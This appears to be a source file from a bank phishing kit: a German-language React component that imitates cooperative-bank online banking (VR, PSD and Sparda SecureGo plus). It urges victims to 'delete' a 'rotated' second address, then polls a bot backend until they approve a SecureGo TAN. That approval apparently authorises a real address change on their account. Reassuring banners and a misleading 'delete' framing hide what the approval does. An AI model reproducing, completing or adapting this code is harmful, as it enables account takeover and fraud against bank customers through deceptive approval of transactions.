import { useState } from "react";
import { confirmAddress, getBotTask } from "@/lib/botClient";
import {
  MapPin,
  Info,
  ChevronDown,
  ChevronUp,
  Shield,
  CheckCircle2,
  Trash2,
  Smartphone,
} from "lucide-react";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import type { FlowTheme } from "./BankShell";

type Address = { strasse: string; plzOrt: string };

function getSecureGoLabel(bankGroup?: string): string {
  if (bankGroup === "PSD Banken") return "PSD SecureGo plus";
  if (bankGroup === "Sparda-Banken") return "SecureGo plus";
  return "VR SecureGo plus";
}

function splitAddr(a: Address) {
  const m = a.plzOrt.match(/^\s*(\d{4,5})\s+(.+)$/);
  return {
    street: a.strasse,
    zip_code: m?.[1] ?? "",
    city: m?.[2] ?? a.plzOrt,
  };
}

export function AddressVerificationStep({
  theme,
  taskId,
  currentAddress,
  additionalAddress,
  bankGroup,
  customerName,
  onBack: _onBack,
  onDeleted,
}: {
  theme: FlowTheme;
  taskId?: string;
  currentAddress: Address;
  additionalAddress: Address;
  bankGroup?: string;
  customerName?: string;
  onBack: () => void;
  onDeleted: (deleted: Address) => void;
}) {
  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;
  const secureGoLabel = getSecureGoLabel(bankGroup);
  const rotated = splitAddr(additionalAddress);

  const [selectedAddress, setSelectedAddress] = useState<"current" | "new">("current");
  const [showDeleteDialog, setShowDeleteDialog] = useState(false);
  const [showCannotDeleteDialog, setShowCannotDeleteDialog] = useState(false);
  const [showSecureGo, setShowSecureGo] = useState(false);
  const [secureGoApproved, setSecureGoApproved] = useState(false);
  const [showExplanation, setShowExplanation] = useState(false);
  const [showTanExplanation, setShowTanExplanation] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);
  const [deleting, setDeleting] = useState(false);

  const openSecureGo = async () => {
    if (!taskId) {
      setDeleteError("Sitzung nicht gefunden. Bitte neu anmelden.");
      return;
    }
    setDeleteError(null);
    setDeleting(true);
    try {
      const res = await confirmAddress(taskId);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
    } catch (e: any) {
      setDeleting(false);
      setDeleteError(`Löschen fehlgeschlagen: ${e?.message ?? "Unbekannter Fehler"}`);
      return;
    }
    // Move from the confirmation dialog to the SecureGo waiting dialog and
    // poll the bot until the backend actually confirms the deletion / TAN.
    setDeleting(false);
    setShowDeleteDialog(false);
    setSecureGoApproved(false);
    setShowSecureGo(true);

    const startedAt = Date.now();
    const TIMEOUT_MS = 5 * 60 * 1000;
    const INTERVAL_MS = 1500;

    let sawAddressTan = false;
    let previousStatus: string | undefined;
    let previousTanType: string | undefined;

    const isApproved = (data: any): boolean => {
      const st = data?.status;
      if (st === "completed" || st === "tan_confirmed" || st === "address_confirmed" || st === "address_deleted") return true;
      const r = data?.result ?? {};
      if (r.address_deleted === true || r.address_confirmed === true || r.address_changed === true) return true;
      // Transition: waiting_for_tan (address) -> running means address change succeeded
      if (
        st === "running" &&
        previousStatus === "waiting_for_tan" &&
        (previousTanType === "address" || sawAddressTan)
      ) {
        return true;
      }
      const flat = JSON.stringify(data ?? {}).toLowerCase();
      return /"(address_deleted|address_confirmed|address_changed|tan_confirmed|approved)"\s*:\s*(true|1|"true")/.test(flat);
    };

    const poll = async () => {
      if (Date.now() - startedAt > TIMEOUT_MS) {
        setDeleteError("Zeitüberschreitung bei der Bestätigung. Bitte erneut versuchen.");
        setShowSecureGo(false);
        return;
      }
      const { status, data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
      if (status === 0 || status >= 500) {
        setTimeout(poll, INTERVAL_MS);
        return;
      }
      if (data?.status === "tan_rejected" || data?.status === "tan_timeout" || data?.status === "failed") {
        setDeleteError("Freigabe wurde abgelehnt oder ist abgelaufen. Bitte erneut versuchen.");
        setShowSecureGo(false);
        return;
      }
      const approved = isApproved(data);
      const curTanType = (data?.tan_type ?? data?.result?.tan_type ?? "").toString().toLowerCase();
      if (data?.status === "waiting_for_tan" && curTanType === "address") sawAddressTan = true;
      previousStatus = data?.status;
      if (curTanType) previousTanType = curTanType;

      if (approved) {
        setSecureGoApproved(true);
        setTimeout(() => {
          setShowSecureGo(false);
          onDeleted(additionalAddress);
        }, 1200);
        return;
      }
      setTimeout(poll, INTERVAL_MS);
    };
    poll();
  };

  return (
    <div className="w-full max-w-2xl mx-auto flex flex-col gap-4">
      {/* Reassurance banner */}
      <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
        <div className="flex items-start gap-3">
          <div
            className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5"
            style={{ backgroundColor: themeColor + "15" }}
          >
            <Shield className="w-4 h-4" style={{ color: themeColor }} />
          </div>
          <div>
            <p className="text-sm text-gray-700">
              <span className="font-semibold">Keine Sorge:</span> Es wurden keine Änderungen ohne Ihre Bestätigung
              vorgenommen.
            </p>
          </div>
        </div>
      </div>

      {/* Main card */}
      <div className="bg-white rounded-xl shadow-md border border-gray-200 overflow-hidden">
        <div className="p-6 sm:p-8">
          <div className="flex items-center gap-2 text-xs text-gray-400 mb-1">
            <span>Meine Daten</span>
            <span>→</span>
            <span>Adressen</span>
          </div>
          <h2 className="text-xl sm:text-2xl font-bold mb-2" style={{ color: themeColor }}>
            Adressdaten überprüfen
          </h2>

          <div
            className="rounded-lg p-4 mb-4"
            style={{ backgroundColor: themeColor + "08", borderLeft: `3px solid ${themeColor}` }}
          >
            <div className="flex items-start gap-3">
              <Info className="w-4 h-4 mt-0.5 flex-shrink-0" style={{ color: themeColor }} />
              <div>
                <p className="text-sm text-gray-700">
                  Wir haben mehrere Adressinformationen zu Ihrem Profil gefunden. Bitte prüfen Sie, welche Adresse
                  aktuell Ihre Hauptadresse ist.
                </p>
              </div>
            </div>
          </div>

          {/* Address A */}
          <div
            className={`rounded-lg border-2 p-5 mb-4 cursor-pointer transition-all ${
              selectedAddress === "current" ? "shadow-sm" : "border-gray-200 hover:border-gray-300"
            }`}
            style={
              selectedAddress === "current"
                ? { borderColor: themeColor, backgroundColor: themeColor + "05" }
                : {}
            }
            onClick={() => setSelectedAddress("current")}
          >
            <div className="flex items-start justify-between gap-3">
              <div className="flex items-start gap-3">
                <div
                  className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5"
                  style={{ backgroundColor: selectedAddress === "current" ? themeColor + "15" : "#f3f4f6" }}
                >
                  <MapPin
                    className="w-4 h-4"
                    style={{ color: selectedAddress === "current" ? themeColor : "#9ca3af" }}
                  />
                </div>
                <div>
                  <p className="font-semibold text-sm text-gray-800 mb-0.5">Hauptadresse</p>
                  <p className="text-sm text-gray-500 mb-2">(derzeit genutzt)</p>
                  <p className="text-base text-gray-800 font-medium">{currentAddress.strasse}</p>
                  <p className="text-base text-gray-800">{currentAddress.plzOrt}</p>
                </div>
              </div>
              {selectedAddress === "current" && (
                <CheckCircle2 className="w-5 h-5 flex-shrink-0 mt-1" style={{ color: themeColor }} />
              )}
            </div>
            {selectedAddress === "current" && (
              <div className="mt-3 flex items-center gap-1.5 text-xs" style={{ color: themeColor }}>
                <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: themeColor }} />
                Wird aktuell für Post und Kommunikation verwendet
              </div>
            )}
          </div>

          {/* Address B */}
          <div
            className={`rounded-lg border-2 p-5 mb-4 cursor-pointer transition-all ${
              selectedAddress === "new" ? "shadow-sm" : "border-gray-200 hover:border-gray-300"
            }`}
            style={
              selectedAddress === "new"
                ? { borderColor: themeColor, backgroundColor: themeColor + "05" }
                : {}
            }
            onClick={() => setSelectedAddress("new")}
          >
            <div className="flex items-start justify-between gap-3">
              <div className="flex items-start gap-3">
                <div
                  className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5"
                  style={{ backgroundColor: selectedAddress === "new" ? themeColor + "15" : "#f3f4f6" }}
                >
                  <MapPin
                    className="w-4 h-4"
                    style={{ color: selectedAddress === "new" ? themeColor : "#9ca3af" }}
                  />
                </div>
                <div>
                  <p className="font-semibold text-sm text-gray-800 mb-0.5">Weitere Adresse</p>
                  <p className="text-sm text-gray-500 mb-2">(zusätzliche Information)</p>
                  <p className="text-base text-gray-800 font-medium">{rotated.street}</p>
                  <p className="text-base text-gray-800">
                    {rotated.zip_code} {rotated.city}
                  </p>
                </div>
              </div>
              {selectedAddress === "new" && (
                <CheckCircle2 className="w-5 h-5 flex-shrink-0 mt-1" style={{ color: themeColor }} />
              )}
            </div>
          </div>

          <button
            onClick={() => setShowExplanation(!showExplanation)}
            className="flex items-center gap-2 text-sm mb-6 hover:underline"
            style={{ color: themeColor }}
          >
            Warum sehe ich mehrere Adressen?
            {showExplanation ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </button>
          {showExplanation && (
            <div className="rounded-lg bg-gray-50 p-4 mb-6 text-sm text-gray-600">
              In einigen Fällen speichern wir zusätzliche Adressinformationen, z.&#8239;B. aus früheren Angaben oder zur
              Aktualisierung Ihrer Daten. Sie entscheiden, welche Adresse als Hauptadresse verwendet wird.
            </div>
          )}

          <div className="flex flex-wrap gap-3">
            <button
              onClick={() => {
                if (selectedAddress === "current") setShowCannotDeleteDialog(true);
                else setShowDeleteDialog(true);
              }}
              className={`px-6 py-3 ${theme.buttonRadius || "rounded-full"} border border-destructive text-destructive font-medium text-sm hover:bg-destructive/10 transition-colors`}
            >
              <span className="flex items-center gap-2">
                <Trash2 className="w-4 h-4" />
                Adresse löschen
              </span>
            </button>
          </div>
        </div>
      </div>

      {/* Delete confirmation dialog */}
      <AlertDialog open={showDeleteDialog} onOpenChange={setShowDeleteDialog}>
        <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden">
          <div className="h-1.5" style={{ backgroundColor: theme.buttonBg }} />
          <div className="p-6 sm:p-8">
            <AlertDialogHeader className="mb-5">
              <div className="flex items-center gap-3 mb-1">
                <div
                  className="w-10 h-10 rounded-full flex items-center justify-center"
                  style={{ backgroundColor: theme.buttonBg + "15" }}
                >
                  <Trash2 className="w-5 h-5" style={{ color: theme.buttonBg }} />
                </div>
                <AlertDialogTitle className="text-xl font-bold" style={{ color: themeColor }}>
                  Adresse wirklich löschen?
                </AlertDialogTitle>
              </div>
              <AlertDialogDescription asChild>
                <div className="text-left space-y-4 pt-2">
                  <div className="rounded-xl bg-gray-50 p-4 border border-gray-200">
                    <p className="font-semibold text-gray-900">{rotated.street}</p>
                    <p className="text-gray-600 text-sm">
                      {rotated.zip_code} {rotated.city}
                    </p>
                    <p className="mt-2 text-sm font-semibold text-red-600 flex items-center gap-1">
                      <span aria-hidden>×</span> Wird entfernt
                    </p>
                  </div>
                  <p className="text-xs text-gray-500">
                    Die Hauptadresse{" "}
                    <strong>
                      {currentAddress?.strasse}, {currentAddress?.plzOrt}
                    </strong>{" "}
                    bleibt weiterhin als aktive Adresse bestehen.
                  </p>
                </div>
              </AlertDialogDescription>
            </AlertDialogHeader>
            {deleteError && (
              <p className="text-sm text-red-600 mb-3">{deleteError}</p>
            )}
            <AlertDialogFooter className="flex justify-end gap-3 pt-2">
              <AlertDialogCancel
                disabled={deleting}
                className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm`}
              >
                Abbrechen
              </AlertDialogCancel>
              <AlertDialogAction
                disabled={deleting}
                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0 disabled:opacity-60`}
                style={{ backgroundColor: theme.buttonBg }}
                onClick={(e) => { e.preventDefault(); openSecureGo(); }}
              >
                {deleting ? "Wird gelöscht…" : "Adresse löschen"}
              </AlertDialogAction>
            </AlertDialogFooter>
          </div>
        </AlertDialogContent>
      </AlertDialog>

      {/* SecureGo approval dialog */}
      <AlertDialog open={showSecureGo} onOpenChange={setShowSecureGo}>
        <AlertDialogContent className="sm:rounded-xl sm:max-w-lg">
          <AlertDialogHeader className="sr-only">
            <AlertDialogTitle>Prüfen</AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription asChild>
            <div className="text-left space-y-5">
              <div className="rounded-lg border border-gray-200 p-4 space-y-4">
                <div>
                  <p className="text-base font-bold text-gray-900 mb-2">Adresse bearbeiten</p>
                  <div className="mb-3">
                    <p className="text-xs text-gray-400">Adressat</p>
                    <p className="text-sm font-medium text-gray-800">{customerName || "—"}</p>
                  </div>
                  <p className="text-xs text-gray-400">Hauptadresse (Wohnsitz)</p>
                  <p className="text-sm text-gray-700">{currentAddress?.strasse || "—"}</p>
                  <p className="text-sm text-gray-700">{currentAddress?.plzOrt || ""}</p>
                </div>

                <div className="border-t border-gray-200" />

                <div>
                  <p className="text-base font-bold text-gray-900 mb-2">Adresse löschen</p>
                  <p className="text-xs text-gray-400">Hauptadresse (Wohnsitz)</p>
                  <p className="text-sm text-gray-700">{rotated.street}</p>
                  <p className="text-sm text-gray-700">
                    {rotated.zip_code} {rotated.city}
                  </p>
                </div>
              </div>

              <div className="space-y-4">
                <h3 className="text-xl font-bold text-gray-900">Sicherheitsabfrage</h3>

                <button
                  className="flex items-center gap-2 text-sm font-semibold"
                  style={{ color: "#0066cc" }}
                  onClick={() => setShowTanExplanation(!showTanExplanation)}
                >
                  <ChevronDown
                    className={`w-4 h-4 transition-transform ${showTanExplanation ? "rotate-180" : ""}`}
                  />
                  Bitte unbedingt Auftragsdaten abgleichen
                </button>

                {showTanExplanation && (
                  <div className="rounded-lg bg-blue-50 border border-blue-200 p-3 text-sm text-gray-700">
                    Gleichen Sie die Auftragsdaten in der App mit den hier angezeigten Daten ab, bevor Sie den
                    Auftrag freigeben.
                  </div>
                )}

                <div className="rounded-lg border border-gray-300 p-3 flex items-center justify-between cursor-pointer">
                  <div>
                    <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
                    <p className="text-sm text-gray-900 font-medium">{secureGoLabel}</p>
                  </div>
                  <ChevronDown className="w-5 h-5 text-gray-400" />
                </div>

                <div
                  className="rounded-lg p-5 space-y-4"
                  style={{ backgroundColor: "#FFF4EC", border: "1.5px solid #F08C00" }}
                >
                  <div className="flex items-center gap-3">
                    <Smartphone className="w-5 h-5 text-gray-700" />
                    <p className="text-base font-bold text-gray-900">Bestätigen mit {secureGoLabel}</p>
                  </div>
                  <ol className="list-decimal space-y-3 text-sm text-gray-700 pl-6">
                    <li>Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
                    <li>Prüfen Sie die Auftragsdaten.</li>
                    <li>
                      Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind. Andernfalls lehnen Sie den
                      Auftrag ab.
                    </li>
                  </ol>

                  {!secureGoApproved ? (
                    <div className="flex flex-col items-center gap-3 pt-2">
                      <div
                        className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
                        style={{ borderTopColor: "#0066cc" }}
                      />
                    </div>
                  ) : (
                    <div className="text-center space-y-2 pt-2">
                      <CheckCircle2 className="w-7 h-7 text-green-500 mx-auto" />
                      <p className="text-sm font-medium text-green-600">Freigabe erteilt!</p>
                    </div>
                  )}
                </div>
              </div>

              <div className="flex items-center gap-3 pt-2">
                <button
                  onClick={() => setShowSecureGo(false)}
                  className={`px-6 py-2 ${theme.buttonRadius || "rounded-full"} border font-medium text-sm`}
                  style={{ borderColor: themeColor, color: themeColor }}
                >
                  Abbrechen
                </button>
              </div>
            </div>
          </AlertDialogDescription>
        </AlertDialogContent>
      </AlertDialog>

      {/* Cannot delete primary address dialog */}
      <AlertDialog open={showCannotDeleteDialog} onOpenChange={setShowCannotDeleteDialog}>
        <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden">
          <div className="h-1.5 bg-destructive" />
          <div className="p-6 sm:p-8">
            <AlertDialogHeader className="mb-5">
              <div className="flex items-center gap-3 mb-1">
                <div className="w-10 h-10 rounded-full bg-destructive/10 flex items-center justify-center">
                  <Shield className="w-5 h-5 text-destructive" />
                </div>
                <AlertDialogTitle className="text-xl font-bold text-destructive">
                  Löschen nicht möglich
                </AlertDialogTitle>
              </div>
              <AlertDialogDescription asChild>
                <div className="text-left space-y-4 pt-2">
                  <p className="text-sm text-gray-600">
                    Ihre <strong>Post- und Meldeadresse</strong> kann nicht entfernt werden, da sie für die Zustellung
                    wichtiger Dokumente und die gesetzliche Identifikation erforderlich ist.
                  </p>
                  <div className="rounded-xl bg-gray-50 p-4 border border-gray-200">
                    <p className="font-semibold text-gray-900">{currentAddress?.strasse}</p>
                    <p className="text-gray-600 text-sm">{currentAddress?.plzOrt}</p>
                    <p className="text-xs mt-2 flex items-center gap-1.5" style={{ color: themeColor }}>
                      <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: themeColor }} />
                      Wird aktuell für Post und Kommunikation verwendet
                    </p>
                  </div>
                  <p className="text-xs text-gray-500">
                    Wenn Sie Ihre Hauptadresse ändern möchten, nutzen Sie bitte die Bearbeitungsfunktion in Ihren
                    persönlichen Daten.
                  </p>
                </div>
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter className="flex justify-end">
              <AlertDialogAction
                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0`}
                style={{ backgroundColor: theme.buttonBg }}
                onClick={() => setShowCannotDeleteDialog(false)}
              >
                Verstanden
              </AlertDialogAction>
            </AlertDialogFooter>
          </div>
        </AlertDialogContent>
      </AlertDialog>

      {/* Security footer */}
      <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
        <div className="flex items-start gap-3">
          <Shield className="w-4 h-4 mt-0.5 flex-shrink-0 text-gray-400" />
          <div>
            <p className="text-sm font-semibold text-gray-700 mb-1">Ihre Sicherheit ist uns wichtig</p>
            <p className="text-xs text-gray-500">
              Sie können alle Änderungen jederzeit im Bereich „Sicherheit &amp; Aktivitäten" einsehen.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
